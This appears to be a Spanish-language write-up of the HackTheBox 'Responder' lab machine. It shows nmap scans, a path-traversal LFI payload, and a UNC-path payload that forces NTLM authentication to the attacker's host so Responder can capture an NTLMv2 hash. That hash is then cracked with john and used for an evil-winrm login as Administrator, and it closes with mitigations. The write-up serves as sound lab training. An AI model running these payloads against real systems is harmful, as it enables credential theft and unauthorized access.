---
layout: post
title: HTB — Responder
date: 2026-05-31
platform: HackTheBox
difficulty: very-easy
description: LFI + captura de hash NTLMv2
tags:
  - LFI
  - NTLMv2
  - Windows
---

## Introducción

Responder es la primera máquina del Tier 1 que requiere encadenar tres vulnerabilidades: un LFI en la aplicación web, la captura de un hash NTLMv2 mediante autenticación forzada, y el crackeo de ese hash para finalmente entrar por WinRM. Si falla cualquier eslabón de la cadena, el siguiente no es posible.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.3.120
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.3.120 -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub?
```

Escaneo de versiones y scripts:

```bash
nmap -sCV -p80,5985,7680 10.129.3.120 -oN target
# -sC          Ejecuta scripts de detección por defecto (NSE)
# -sV          Detecta versión del servicio
# -p           Escanea solo los puertos especificados
# -oN          Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Unika
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  pando-pub?
Service Info: OS: Windows
```

- **Puerto 80:** Apache + PHP en Windows — sitio "Unika"
- **Puerto 5985:** WinRM — shell remota si conseguimos credenciales
- **Puerto 7680:** Windows Update, ignorar

Nmap detectó el hostname `unika.htb`. Lo agrego al hosts:

```bash
echo "10.129.3.120  unika.htb" >> /etc/hosts
# Hace que unika.htb resuelva a la IP del objetivo
```

---

## Enumeración web

Visito `http://unika.htb`. Sitio con selector de idioma. Al cambiar el idioma la URL revela:

```
http://unika.htb/index.php?page=french.html
```

El parámetro `page=` carga archivos dinámicamente — candidato a LFI.

---

## Explotación — Fase 1: confirmar LFI

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

El navegador devuelve el contenido del archivo hosts de Windows. **LFI confirmado.**

---

## Explotación — Fase 2: capturar hash NTLMv2

El LFI acepta rutas UNC (`\\IP\recurso`). Cuando el servidor intenta acceder a una ruta UNC apuntando a mi máquina, Windows inicia autenticación NTLM — Responder intercepta ese handshake.

Levanto Responder:

```bash
responder -I tun0 -v
# -I    Interfaz de red activa en HTB (tun0)
# -v    Verbose: muestra en tiempo real todo lo que captura
```

Fuerzo la autenticación desde el navegador:

```
http://unika.htb/index.php?page=\\10.10.x.x\share
```

Responder captura el hash NTLMv2:

```
[SMB] NTLMv2 Hash captured:
Administrator::RESPONDER:5dcalef5b453b5b3:[hash_completo]
```

---

## Explotación — Fase 3: crackear el hash

Guardo el hash:

```bash
nano hash.txt
# Pego el hash completo en formato:
# Administrator::RESPONDER:challenge:hash
```

Crackeo con john:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# hash.txt       Archivo con el hash NTLMv2 capturado
# --wordlist     Wordlist de contraseñas a probar
```

```
badminton        (Administrator)
```

---

## Explotación — Fase 4: acceso por WinRM

```bash
evil-winrm -i 10.129.3.120 -u Administrator -p badminton
# -i    IP del objetivo
# -u    Usuario
# -p    Contraseña crackeada
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

## Flag

```powershell
type C:\Users\mike\Desktop\flag.txt
# ea81b7afddd03efaa0945333ed147fac
```

---

## ¿Qué aprendemos de esto?

**LFI es una vulnerabilidad crítica subestimada.** Incluir archivos del sistema desde un parámetro URL puede usarse para forzar autenticaciones NTLM y obtener credenciales del sistema.

**NTLMv2 es crackeable offline.** Una vez capturado el hash, el ataque ocurre completamente en tu máquina. Una contraseña débil como `badminton` cae en segundos contra rockyou.

**WinRM es la puerta trasera de Windows.** El puerto 5985 estaba abierto desde el inicio. Sin credenciales era inútil — con credenciales se convierte en acceso total.

**El encadenamiento multiplica el impacto.** LFI + Responder + john + WinRM — cuatro herramientas, cada una dependiente de la anterior.

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puertos | 80/tcp (Apache + PHP), 5985/tcp (WinRM) |
| Vulnerabilidad | LFI en `?page=` + captura de hash NTLMv2 vía ruta UNC |
| Hash capturado | NTLMv2 de Administrator |
| Contraseña | `badminton` (crackeada con john + rockyou) |
| Acceso obtenido | Shell como Administrator vía WinRM |
| Herramientas | `nmap`, `responder`, `john`, `evil-winrm` |
| Mitigación | Sanitizar parámetros de inclusión de archivos, deshabilitar NTLM donde no sea necesario, usar contraseñas robustas, restringir WinRM por IP |
